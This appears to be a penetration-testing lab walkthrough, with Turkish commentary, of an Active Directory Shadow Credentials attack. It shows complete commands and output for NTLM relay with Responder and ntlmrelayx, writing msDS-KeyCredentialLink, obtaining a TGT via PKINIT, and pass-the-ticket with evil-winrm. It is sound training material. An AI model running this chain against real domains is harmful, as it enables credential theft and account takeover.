# Shadow Credentials

## Requirements

* Domain üzerinde [Active Directory Certificate Services](https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/active-directory-certificate-services-overview) (AD CS) yapılandırılmış olmalıdır.
* Domain üzerinde [Certificate Authority](https://learn.microsoft.com/en-us/windows-server/networking/core-network-guide/cncg/server-certs/install-the-certification-authority) yapılandırılmış olmalıdır.
* Domain üzerinde [PKINIT](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pkca/d0cf1763-3541-4008-a75f-a577fa5e8c5b) kullanılabilir durumda olmalıdır.

## Scenario

* Cinthia Jaq hesabı Jeffry Perez hesabı üzerinde [GenericAll](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=windowsdesktop-9.0) ayrıcalığına sahiptir.
* CJAQ hesabına ait ayrıcalıklar kullanılarak JPEREZ hesabına ait [msDS-KeyCredentialLink](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/f70afbcc-780e-4d91-850c-cfadce5bb15c) niteliği alternatif kimlik bilgileri ile güncellenir.
* Saldırı sırasında [PFX](https://learn.microsoft.com/en-us/windows-hardware/drivers/install/personal-information-exchange---pfx--files) formatına sahip bir [X.509](https://learn.microsoft.com/en-us/azure/iot-hub/reference-x509-certificates) sertifikası elde edilir.
* Elde edilen sertifika kullanılarak bir TGT talep edilir.

## Hosts File

```sh
htb-student@ubuntu:~$ echo "172.16.117.3 inlanefreight.local dc01.inlanefreight.local" | sudo tee -a /etc/hosts
```

## Disabling Responder HTTP

```ini title="Responder.conf" linenums="17"
HTTP     = Off
```

## Responder

```sh
htb-student@ubuntu:~$ sudo Responder.py -I ens192
```

## Performing the Attack

```sh
htb-student@ubuntu:~$ sudo ntlmrelayx.py -t ldap://INLANEFREIGHT\\'CJAQ'@172.16.117.3 --no-dump --no-da --no-acl --no-smb-server --shadow-credentials --shadow-target 'JPEREZ'
```

```output title="Output" hl_lines="11 13 16-17"
[*] HTTPD(80): Connection from INLANEFREIGHT/CJAQ@172.16.117.60 controlled, attacking target ldap://INLANEFREIGHT\CJAQ@172.16.117.3
[*] HTTPD(80): Authenticating against ldap://INLANEFREIGHT\CJAQ@172.16.117.3 as INLANEFREIGHT/CJAQ SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains
[*] All targets processed!
[*] Searching for the target account
[*] Target user found: CN=Jeffry Perez,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 7424350d-b100-1f89-e2f3-94746787b11f
[*] Updating the msDS-KeyCredentialLink attribute of JPEREZ
[*] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Saved PFX (#PKCS12) certificate & key at path: 2N7fDgU9.pfx
[*] Must be used with password: gVlByNhDBDoGeIzreMYP
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
[*] Run the following command to obtain a TGT
[*] python3 PKINITtools/gettgtpkinit.py -cert-pfx 2N7fDgU9.pfx -pfx-pass gVlByNhDBDoGeIzreMYP INLANEFREIGHT.LOCAL/JPEREZ 2N7fDgU9.ccache
```

## Obtaining the Ticket

!!! success

    * TGT talep edildi.
    * AS-REP anahtarı öğrenildi.

```sh
htb-student@ubuntu:~$ python3 PKINITtools/gettgtpkinit.py -cert-pfx 2N7fDgU9.pfx -pfx-pass gVlByNhDBDoGeIzreMYP INLANEFREIGHT.LOCAL/JPEREZ 2N7fDgU9.ccache
```

```output title="Output" hl_lines="10"
2025-01-31 23:54:38,820 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2025-01-31 23:54:38,839 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2025-01-31 23:54:58,691 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2025-01-31 23:54:58,692 minikerberos INFO     8b24d09c342ae8ba61d8b765745806254c8948e6b59826911b10c685b28ce27f
INFO:minikerberos:8b24d09c342ae8ba61d8b765745806254c8948e6b59826911b10c685b28ce27f
2025-01-31 23:54:58,696 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
```

## Pass-the-Ticket

```sh
htb-student@ubuntu:~$ export KRB5CCNAME='2N7fDgU9.ccache'
htb-student@ubuntu:~$ evil-winrm -i DC01.INLANEFREIGHT.LOCAL --realm INLANEFREIGHT.LOCAL
```
